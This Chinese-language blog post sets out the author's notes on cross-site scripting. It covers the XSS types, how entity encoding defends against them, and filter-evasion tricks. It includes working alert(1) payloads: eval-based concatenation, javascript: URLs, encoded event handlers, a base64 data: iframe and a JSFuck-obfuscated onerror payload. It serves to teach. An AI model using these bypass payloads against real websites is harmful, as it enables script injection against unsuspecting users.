---
title: "我对XSS的当前理解"
date: 2025-09-25
categories: [xss]

---



## 针对XSS的提问：



#### 1.**xss的三种类型？**

- 反射型，存储型，DOM型（这个与前两个不同在于它是前端引发的）

#### 2.反射型实现的前提？

- 构造出的url链接需要被受害者浏览器请求（点击，跳转等：手动居多）
- 有攻击者可以控制的参量且该参量对应的值会被放进html（就是后端会将参量值放在html代码中然后发给用户浏览器渲染）

- 返回的xss payload没有被实体编码

#### 3.存储型实现的前提？

- 构造的xss payload被保存在服务器数据库中（保存前未被实体编码，保证payload仍能被解析）

#### 4.DOM型实现的前提？

- 攻击者可以控制能进入DOM的一些参数
- JavaScript不安全地插入参数值（未过滤或过滤不严）

#### 5.XSS攻击的落脚点？

- 找到或构造浏览器js执行环境，然后运行payload（一般是浏览器针对js拓展的函数，如：alert()，fetch()）

#### 6.有js执行环境的地方？

- `<script></script>`
- 事件属性（onclick，onerror，onload等）后面，几乎所有HTML标签都可以加事件属性
- 伪协议javascript:后面

#### 7.伪协议javascript在哪些标签内能使用？

- 所有接受url属性的标签

- ```javascript
  <a href="javascript:alert(1)">点我</a>
  <iframe src="javascript:alert(1)"></iframe> //这是在当前页面嵌套一个独立的网页
  <form action="javascript:alert(1)"> //这个是收集用户输入并提交到服务器的表单容器
  <button formaction="javascript:alert(1)">按钮</button>
  😒属性名多了，有点记不住
  ```

#### 8.为什么实体编码能够防xss？

- HTML文档的渲染分为分词，DOM，渲染三步。实体编码的作用就是让`<script>`在分词时不会被认为是script标签而是将其作为文本。

- 但是实体编码毕竟不是很好看，所以在构建DOM树时，会进行实体解码成Unicode字符（DOM树上这个节点已经是解码过的）

- > When an HTML entity is encountered, it is replaced with the corresponding Unicode character during tokenization. The resulting character(s) are included as character tokens. --from WHATWG HTML

  > HTML entities are decoded by the browser when rendering, so `<` appears as `<` in the browser window, but remains `<` in the source code.
  >
  > --from MDN

#### 9.一些绕过滤？

- 写在前面：现在网上流传的绕过方法非常的多（🤔可以说是有点庞杂了），有很多在新版浏览器中早就不支持了，如果本身不知道原理而只是去搜索绕过技巧反而很浪费时间。而且说真的，你真不好奇为什么这种绕过是成立的，总不能说是开发者给攻击利用留了“后门"吧🤣。

- 谈一下js支持的编码
  >https://262.ecma-international.org/14.0/#prod-EscapeSequence
  >
  >这是javascript转义的官方规范说明

  当前支持的编码转义：`\xNN`十六进制，`\uNNNN or \u{N...}`Unicode，`\NNN`八进制（旧写法，非严格模式下可用）

- 绕过关键词匹配

  - 使用换行：（这些是针对字符串的，如果想要让其当作代码执行可用eval,new Function,setTimeout等函数）
    - 对于单引号或双引号包围的，使用`\%0a`来换行
    - 对于反引号包围的，直接换行就行
  - 运用字符串拼接：（按理来说这两个函数怕是早ban了，不过可以试试）
    - `<img src="x" onerror="a='aler';b='t';c='(1);';eval(a+b+c)">`
    - `<script>top["al"+"ert"](1);</script>`
  - 大小写（话说现在真的还有这个吗？）
  - 双写（这个更少了😒）
  - 换个关键词😊
  
- 绕过空格过滤

  - 使用`/`
  - 换行，因为js是用`;`来判断结束的
  
- 一个奇怪的方法：
  在HTML中，script标签的闭合是优先于注释（`//`）的，所以使用`<<<script>var a="\\";alert(1);//</script>`
  （这里的使用还能看到对于浏览器的容忍的运用）

  > When the HTML parser encounters a `<script>` start tag, it switches to the “script data” state. It keeps reading characters until it finds a matching `</script>` end tag, regardless of what is inside (including JS comments, strings, etc.). --from HTML Living Standard

  或者：
  用一些优先级高的标签去闭合优先级低的标签，例如：title>img

- 万金油的方法--编码：
  `<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>`
  `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#59;>`
  需要一些类似eval，top的危险函数的（因为payload编在字符串里面，无法直接运行），还有的跟别的编码有关（例如base64）
  `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`
  <u>经测试，js能直接识别的编码是unicode和HTML实体编码，就是说放在js环境里面能够直接解码运行的</u>
  <u>十六进制，八进制等需要作为字符串写在eval等函数的括号内</u>
  这里想想为什么实体编码能够运行？（前面提过了）

- 讲个好玩的😋
  你可以试试这个：
  `<img/src=x onerror=[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+[+!+[]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]])>`
  网站：https://jsfuck.com/
  这个的原理和js的类型自动转换有关：

  - `+`一元运算符会将其右侧的值转化为数字-->`+[]`就是0

    > https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Unary_plus

  - 加法运算符（`+`）为两种不同的运算重载：数字加法和字符串连接-->`[]+[]`就是`""`

    > 如果对象有 `[Symbol.toPrimitive]` 方法，优先调用它（`hint` 为 `"default"`）
    > 否则根据 `hint` 调用 `valueOf()`，如果不是原始值，再调用 `toString()`（原始值是指不是对象的不可再分的基本数据类型）
    > https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Addition

  - `!`取个非，就把`false`改为`true`，0改为1，`![]+[]得到"false"`

  - 剩下的一些基本类型在网站上也有，理解方面应该大致是不差的

  JSFUCK真是太厉害了😍

---

**介绍几个现成payload的网站：**

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- http://bing.com



---

跟XSS有点联系的是CORS

先讲这么多吧，以后有发现了再来补充
